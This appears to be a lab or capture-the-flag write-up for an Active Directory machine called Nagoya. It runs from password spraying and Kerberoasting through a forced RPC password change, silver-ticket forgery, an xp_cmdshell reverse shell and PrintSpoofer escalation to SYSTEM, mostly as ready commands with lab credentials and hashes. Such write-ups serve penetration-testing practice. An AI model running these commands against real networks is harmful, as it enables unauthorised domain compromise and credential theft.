# Nagoya: Machine Notes

## Recon

### Nmap
- **AD Ports**: 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 3389, 5985, 9389
- **Web Port**: 80, 8080 (Werkzeug)
- **Domain**: `nagoya-industries.com`
- **Host**: `DC01` / `nagoya`

### OSINT / Initial Access
1. **User Discovery**: Scraped names from port 80 and converted to `first.last` format.
2. **Password Spraying**: Used OSINT logic (Season + Year).
3. **Execution** (Kerbrute):
   ```bash
   kerbrute passwordspray --dc 10.10.10.10 -d nagoya-industries.com users.txt "Spring2023"
   ```
4. **Result**: `Craig.Carr:Spring2023`

---

## Pivoting & Lateral Movement

### Extracting Creds from .EXE (RE Lite)
1. Found `.exe` file on an SMB share.
2. Used `strings` with UTF-16 little-endian flag:
   ```bash
   strings -e l svc_helpdesk.exe
   ```
3. **Result**: `svc_helpdesk:U299iYRmikYTHDbPbxPoYYfa2j4x4cdg`

### Kerberoasting
- Used `svc_helpdesk` credentials to roast:
  ```bash
  impacket-GetUserSPNs -request -dc-ip 10.10.10.10 nagoya-industries.com/svc_helpdesk:[PASS]
  ```
- **Result**: `svc_mssql:Service1`

### RPC Password Change (Abusing Permissions)
- BloodHound shows `svc_helpdesk` has **ForceChangePassword** (or similar) on `Christopher.Lewis`.
- **Execution**:
  ```bash
  net rpc password "christopher.lewis" "NewPassword123!" -U "nagoya-industries.com"/"svc_helpdesk"%"[PASS]" -S "10.10.10.10"
  ```
- **Result**: `christopher.lewis:NewPassword123!` (Gain WinRM access).

---

## Domain Admin (Silver Ticket)

### Silver Ticket Attack (MSSQL)
1. **Requirements**:
   - Target User: `Administrator`
   - Target SPN: `MSSQL/nagoya.nagoya-industries.com`
   - Service NTHash (svc_mssql): `E3A0168BC21CFB88B95C954A5B18F57C`
   - Domain SID: `S-1-5-21-1969309164-1513403977-1686805993`
2. **Execution** (Ticketer):
   ```bash
   impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid "S-1-5..." -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com Administrator
   ```
3. **Inject Ticket**:
   ```bash
   export KRB5CCNAME=Administrator.ccache
   ```

---

## Privilege Escalation

### MSSQL to System (xp_cmdshell)
1. **Port Forwarding** (Chisel):
   Since SQL is local only:
   `chisel client 172.10.10.10:445 R:1433:127.0.0.1:1433`
2. **SQL Connection**:
   Connect as Administrator (using ticket): `impacket-mssqlclient -k nagoya.nagoya-industries.com`
3. **Enable RCE**:
   `enable_xp_cmdshell`
4. **Reverse Shell**:
   `xp_cmdshell 'powershell -c ...'`
5. **SeImpersonate Abuse**:
   `whoami /priv` shows `SeImpersonatePrivilege`.
   `.\PrintSpoofer64.exe -i -c cmd`
6. **Result**: `NT AUTHORITY\SYSTEM`.
